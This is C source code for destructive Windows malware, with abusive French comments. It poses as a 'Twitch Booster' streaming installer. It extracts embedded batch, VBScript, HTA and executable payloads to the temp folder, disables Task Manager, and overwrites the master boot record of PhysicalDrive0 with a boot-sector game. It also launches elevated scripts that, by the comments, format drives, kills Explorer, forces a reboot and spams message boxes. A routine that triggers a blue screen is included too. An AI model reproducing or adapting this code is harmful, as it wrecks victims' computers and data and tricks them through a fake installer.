#define _WIN32_WINNT 0x0502
#define _UNICODE // gcc clc si tu met pas en unicode et je compile avec gcc
#include <Windows.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdbool.h>
#include <shlobj.h>
#include <process.h>
#include <stdint.h>
#include <wchar.h>
#include <mmsystem.h>
#include <shlwapi.h> // PathAppendW
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "shell32.lib")



// j’ai juste steal le MBR overwrite et le taskmgr disable.


void suce() {
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
    }
}

// basically c’te merde fait bsod.



// la tu voit fdp je stock du hex dans la variable MasterBootRecord , ce hex est le jeu snake en ASM compilé en .bin via nasm.

const unsigned char MasterBootRecord[] = {
  0xea, 0x05, 0x7c, 0x00, 0x00, 0x31, 0xc0, 0x8e, 0xd8, 0xb8, 0x14, 0x11, 0x31, 0xdb, 0xcd, 0x10, 
  0xb4, 0x01, 0xb9, 0x00, 0x20, 0xcd, 0x10, 0xbe, 0x00, 0x80, 0x66, 0xc7, 0x04, 0x6f, 0x00, 0x31, 
  0x12, 0x66, 0xc7, 0x44, 0x04, 0x6f, 0x00, 0x35, 0x0c, 0x66, 0xc7, 0x44, 0x08, 0x6f, 0x00, 0x22, 
  0x02, 0x66, 0xc7, 0x44, 0x0c, 0x6f, 0x00, 0x1f, 0x13, 0x66, 0xc7, 0x44, 0x10, 0x6f, 0x00, 0x05, 
  0x15, 0x66, 0xc7, 0x44, 0x14, 0x40, 0x06, 0x28, 0x0c, 0x66, 0xc7, 0x44, 0x18, 0x23, 0x06, 0x27, 
  0x0c, 0x66, 0xc7, 0x44, 0x1c, 0x23, 0x06, 0x26, 0x0c, 0x66, 0xc7, 0x44, 0x20, 0x2a, 0x06, 0x25, 
  0x0c, 0xfa, 0xc7, 0x06, 0x24, 0x00, 0x91, 0x7c, 0xc7, 0x06, 0x26, 0x00, 0x00, 0x00, 0xc7, 0x06, 
  0x20, 0x00, 0xb7, 0x7c, 0xc7, 0x06, 0x22, 0x00, 0x00, 0x00, 0xfb, 0xe8, 0x58, 0x01, 0xeb, 0xfe, 
  0xe4, 0x70, 0x24, 0x80, 0xe6, 0x70, 0xe4, 0x71, 0x38, 0xc8, 0x76, 0x04, 0xd0, 0xe8, 0xeb, 0xf8, 
  0xc3, 0x60, 0xe4, 0x60, 0x2c, 0x47, 0x3c, 0x09, 0x77, 0x17, 0x88, 0xc2, 0xa2, 0x15, 0x80, 0x66, 
  0xa1, 0x14, 0x80, 0x88, 0xd4, 0x8b, 0x1e, 0xd3, 0x7c, 0x66, 0x89, 0x07, 0x83, 0x06, 0xd3, 0x7c, 
  0x04, 0xb0, 0x20, 0xe6, 0x20, 0x61, 0xcf, 0x60, 0xa0, 0xfb, 0x7d, 0x08, 0xc0, 0x75, 0x08, 0xe8, 
  0x13, 0x00, 0xc6, 0x06, 0xfb, 0x7d, 0x03, 0xfe, 0x0e, 0xfb, 0x7d, 0xb0, 0x20, 0xe6, 0x20, 0x61, 
  0xcf, 0x24, 0x80, 0x00, 0xa0, 0xe8, 0xfe, 0x00, 0xbe, 0x00, 0x80, 0x8a, 0x04, 0x08, 0xc0, 0x0f, 
  0x84, 0xf2, 0x00, 0x50, 0x8b, 0x54, 0x02, 0x8a, 0x4c, 0x01, 0x80, 0xf9, 0x00, 0x0f, 0x84, 0xb9, 
  0x00, 0x80, 0xf9, 0x01, 0x74, 0x16, 0x80, 0xf9, 0x04, 0x74, 0x09, 0x80, 0xf9, 0x06, 0x74, 0x08, 
  0xfe, 0xc6, 0xeb, 0x0a, 0xfe, 0xca, 0xeb, 0x06, 0xfe, 0xc2, 0xeb, 0x02, 0xfe, 0xce, 0x53, 0xbb, 
  0x00, 0x80, 0x8b, 0x4f, 0x02, 0x09, 0xc9, 0x74, 0x6a, 0x39, 0xd1, 0x75, 0x61, 0x8a, 0x0f, 0x80, 
  0xf9, 0x23, 0x0f, 0x84, 0xc4, 0x00, 0x80, 0xf9, 0x6f, 0x75, 0x53, 0x3c, 0x40, 0x75, 0x4f, 0x8b, 
  0x3e, 0xd1, 0x7c, 0x66, 0x8b, 0x45, 0xfc, 0x8b, 0x4d, 0xfe, 0x80, 0xfc, 0x01, 0x74, 0x0e, 0x80, 
  0xfc, 0x04, 0x74, 0x0d, 0x80, 0xfc, 0x06, 0x74, 0x0c, 0xfe, 0xcd, 0xeb, 0x0a, 0xfe, 0xc5, 0xeb, 
  0x06, 0xfe, 0xc1, 0xeb, 0x02, 0xfe, 0xc9, 0xc6, 0x45, 0xfc, 0x23, 0x89, 0xc8, 0x66, 0xc1, 0xe0, 
  0x10, 0x8b, 0x45, 0xfc, 0xb0, 0x2a, 0x66, 0x89, 0x05, 0x83, 0x06, 0xd1, 0x7c, 0x04, 0xb1, 0x4f, 
  0xe8, 0x0d, 0xff, 0x88, 0x47, 0x02, 0xb1, 0x18, 0xe8, 0x05, 0xff, 0x88, 0x47, 0x03, 0x83, 0xc3, 
  0x04, 0xeb, 0x8f, 0xbb, 0x00, 0xa0, 0x8b, 0x4f, 0x02, 0x09, 0xc9, 0x74, 0x1c, 0x39, 0xd1, 0x75, 
  0x13, 0x8a, 0x4f, 0x01, 0x08, 0xc9, 0x74, 0x0c, 0x88, 0x4c, 0x01, 0x80, 0x3c, 0x2a, 0x75, 0x04, 
  0xc6, 0x47, 0x01, 0x00, 0x83, 0xc3, 0x04, 0xeb, 0xdd, 0x5b, 0x58, 0x80, 0xfe, 0x18, 0x77, 0x3a, 
  0x80, 0xfa, 0x4f, 0x77, 0x35, 0xb4, 0x02, 0xcd, 0x10, 0x31, 0xdb, 0x3c, 0x6f, 0x75, 0x04, 0xb3, 
  0x04, 0xeb, 0x02, 0xb3, 0x02, 0xb9, 0x01, 0x00, 0xb4, 0x09, 0xcd, 0x10, 0x89, 0x54, 0x02, 0x83, 
  0xc6, 0x04, 0xe9, 0x06, 0xff, 0xc3, 0x60, 0x06, 0xb8, 0x00, 0xb8, 0x8e, 0xc0, 0x31, 0xff, 0xb8, 
  0x20, 0x02, 0xb9, 0xd0, 0x07, 0xf3, 0xab, 0x07, 0x61, 0xc3, 0xb8, 0x00, 0xb8, 0x8e, 0xc0, 0x31, 
  0xff, 0xb8, 0x20, 0x44, 0xb9, 0xd0, 0x07, 0xf3, 0xab, 0xeb, 0xfe, 0x02, 0x00, 0x00, 0x55, 0xaa
};

// ca, ca encule un mbr bien profond.
void mbr() {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 65024, &dwBytesWritten, 0);
	CloseHandle(hDevice);
}





// ici on est sur les fonc du dropper.

static BOOL writeBufferToFile(LPCWSTR path, const void *buf, DWORD size) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written = 0;
    BOOL ok = WriteFile(h, buf, size, &written, NULL) && (written == size);
    CloseHandle(h);
    return ok;
}

static BOOL extractResourceByName(LPCWSTR resName, LPCWSTR outPath) {
    HRSRC hrsrc = FindResourceW(NULL, resName, RT_RCDATA);
    if (!hrsrc) return FALSE;
    HGLOBAL hglob = LoadResource(NULL, hrsrc);
    if (!hglob) return FALSE;
    DWORD size = SizeofResource(NULL, hrsrc);
    if (size == 0) return FALSE;
    void *data = LockResource(hglob);
    if (!data) return FALSE;
    return writeBufferToFile(outPath, data, size);
}








static void print_win_error(const wchar_t *context, LONG err) {
    if (err == ERROR_SUCCESS) return;
    LPWSTR msg = NULL;
    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, (DWORD)err, 0, (LPWSTR)&msg, 0, NULL
    );
    fwprintf(stderr, L"%s: erreur 0x%08lX - %s\n", context, err, msg ? msg : L"(message introuvable)");
    if (msg) LocalFree(msg);
}

// bout de code useless qui servait a une ancienne version, le calculez pas il reste par nostalgie
void bsod(){
    Sleep(260000);
    suce();
}


// je prepare le thread pour bien spam les msgbox.
DWORD WINAPI spam(LPVOID arg) {
    while(1){
        ShellExecuteW(NULL, L"open", L"spam.exe", NULL, NULL, SW_SHOWNORMAL);
    }
}

// ici celui de IDNO sur l’installateur.
unsigned __stdcall caca_thread(void *arg) {
    MessageBoxW(NULL, L"AH WE T SUR SALE PUTE ? CA VA TE MELER TU LE SAIS CA ? ", L"L'Élite de la nation", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
    suce();
    return 0;
}


// installateur.
void tb() {
    if (MessageBoxW(NULL, L"Bienvenue dans l'installateur du Twitch Booster pour OBS et XSplit. Souhaitez vous procéder à l'installation ?", L"Twitch Booster", MB_YESNO | MB_SYSTEMMODAL) == IDYES) {
        // si le poto met oui, installation.
        Sleep(3000);
        MessageBoxW(NULL, L"Installation terminée, vous pouvez maintenant streamer sur Twitch sans aucun problèmes de connexion ou autre !", L"Twitch Booster", MB_OK | MB_SYSTEMMODAL);
    }
    else {
    // si non, on passe direct aux payloads.
    ShellExecuteW(NULL, L"open", L"yo.bat", NULL, NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", L"keys.vbs", NULL, NULL, SW_SHOWNORMAL);
    _beginthreadex(NULL, 0, caca_thread, NULL, 0, NULL);
    _beginthreadex(NULL, 0, caca_thread, NULL, 0, NULL);
    _beginthreadex(NULL, 0, caca_thread, NULL, 0, NULL);
    Sleep(15000);
    ShellExecuteW(NULL, L"runas", L"pay.bat", NULL, NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", L"risi.hta", NULL, NULL, SW_SHOWNORMAL);
    system("taskkill /f /im explorer.exe");
    system("shutdown -r -t 300 -c \"dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul :)\"");
    Sleep(500); // pour eviter que la hta freeze tout a elle seule
    ShellExecuteW(NULL, L"open", L"disk.vbs", NULL, NULL, SW_SHOWNORMAL);
    ShellExecuteW(NULL, L"open", L"keys.vbs", NULL, NULL, SW_SHOWNORMAL);
        ShellExecuteW(NULL, L"open", L"music.vbs", NULL, NULL, SW_SHOWNORMAL);
    Sleep(1200); // pour laisser le temps aux pc de merde de comprendre la situation et load la hta
    Sleep(300);
    ShellExecuteW(NULL, L"open", L"caca.vbs", NULL, NULL, SW_SHOWNORMAL);
    ShellExecuteW(NULL, L"open", L"melter.exe", NULL, NULL, SW_SHOWNORMAL);
    HANDLE h = CreateThread(NULL, 0, spam, NULL, 0, NULL);
    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
struct {
    LPCWSTR resID;
    LPCWSTR outName;
} files[] = {
    { L"IDR_SPAM_EXE",    L"spam.exe" },
    { L"IDR_PAY_BAT",     L"pay.bat" },
    { L"IDR_YO_BAT",      L"yo.bat" },
    { L"IDR_YOP_BAT",     L"yop.bat" },
    { L"IDR_RISITAS_JPG", L"risitas.jpg" },
    { L"IDR_RISI_HTA",    L"risi.hta" },
    { L"IDR_DISK_VBS",    L"disk.vbs" },
    { L"IDR_KEYS_VBS",    L"keys.vbs" },
    { L"IDR_VOIX_VBS",    L"voix.vbs" },
    { L"IDR_MUSIC_VBS",   L"music.vbs" },
    { L"IDR_ISSOU_MP3",   L"issou.mp3" },
    { L"IDR_MELTER_EXE",  L"melter.exe" }
};
    wchar_t tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath)) printf("error");

    wchar_t outDir[MAX_PATH];
    wcscpy(outDir, tempPath);
    if (!PathAppendW(outDir, L"booster")) printf("error");

    if (!CreateDirectoryW(outDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) printf("error");

for (int i = 0; i < sizeof(files)/sizeof(files[0]); ++i) {
    wchar_t outFile[MAX_PATH];
    wcscpy(outFile, outDir);
    if (!PathAppendW(outFile, files[i].outName)) continue;

    wprintf(L"Extraction de %s vers %s\n", files[i].resID, outFile);
    if (!extractResourceByName(files[i].resID, outFile)) {
        print_win_error(L"extractResourceByName", GetLastError());
    }
}

    SetCurrentDirectoryW(outDir);
    // dropper rapide un peu skiddé.
    
    // je desac taskmgr via C puisque parfois batch isnt enough
HKEY hKey = NULL;
LONG result;
DWORD value = 1;
BOOL silent = FALSE;

char *token = strtok(lpCmdLine, " ");
while (token != NULL) {
    if (strcmp(token, "-s") == 0 || strcmp(token, "--silent") == 0)
        silent = TRUE;
    token = strtok(NULL, " ");
}

result = RegCreateKeyExA(
    HKEY_CURRENT_USER,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
    0,
    NULL,
    REG_OPTION_NON_VOLATILE,
    KEY_SET_VALUE,
    NULL,
    &hKey,
    NULL
);

// si ca foire, sur le stream on le verra.
if (result != ERROR_SUCCESS) {
    MessageBoxW(NULL, L"erreur : impossible de supprimer le STREAM MGR , cette erreur n’est pas un problème, l’éxécution continue.", L"Stream helpers", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
}

result = RegSetValueExA(
    hKey,
    "DisableTaskMgr",
    0,
    REG_DWORD,
    (const BYTE*)&value,
    sizeof(value)
);

if (result != ERROR_SUCCESS) {
    RegCloseKey(hKey);
}

RegCloseKey(hKey);

if (!silent) {
    printf("pute que t pk tu lis");
}

// priorite, on overwrite mbr
    mbr();
    // on enchaine sur yop.bat avec le parametre runas pour l’open en admin
    ShellExecuteW(NULL, L"runas", L"yop.bat", NULL, NULL, SW_HIDE);
    // installateur appelé via tb
    tb();
    // 60s delay
    Sleep(60000);
    ShellExecuteW(NULL, L"open", L"yo.bat", NULL, NULL, SW_HIDE);
    // yo.bat se charge de la voix
    Sleep(15000);
    // pay.bat formate un max et taskkill
    ShellExecuteW(NULL, L"runas", L"pay.bat", NULL, NULL, SW_HIDE);
    // j’open la hta.
    ShellExecuteW(NULL, L"open", L"risi.hta", NULL, NULL, SW_SHOWNORMAL);
    // j’ai juge important de quand meme faire ces deux commandes via le main.c
    system("taskkill /f /im explorer.exe");
    system("shutdown -r -t 300 -c \"dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul :)\"");
    Sleep(500); // pour eviter que la hta freeze tout a elle seule
    ShellExecuteW(NULL, L"open", L"disk.vbs", NULL, NULL, SW_SHOWNORMAL);
    // qui a un lecteur disque en 2025 tu me dira
    ShellExecuteW(NULL, L"open", L"keys.vbs", NULL, NULL, SW_SHOWNORMAL);
    // bah oui fdp sinon win+r et ya plus de virus
    ShellExecuteW(NULL, L"open", L"music.vbs", NULL, NULL, SW_SHOWNORMAL);
    // le script pour la musique a un petit delai de 2-3 s , parfait.
    Sleep(1200); // pour laisser le temps aux pc de merde de comprendre la situation et load la hta
    Sleep(300);
    ShellExecuteW(NULL, L"open", L"caca.vbs", NULL, NULL, SW_SHOWNORMAL);
    // Cadillac fait caca, Caca d'amour Caca du coeur, Cadillac fait caca, Par coeur, Cadillac, Cadillac, caca, caca, J'ai vu une grosse mouche dingue dans les escaliers, Elle s'cognait la tête, rah, je l'ai écrasee, Après, énervé, j'suis sorti relaxé, Les gens étaient moyens, cet air qui les rend transparents
    ShellExecuteW(NULL, L"open", L"melter.exe", NULL, NULL, SW_SHOWNORMAL);
    // toujours en dernier
    // je lance un thread pour spam msgbox.
    HANDLE h = CreateThread(NULL, 0, spam, NULL, 0, NULL);
    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);
    return 0;
}




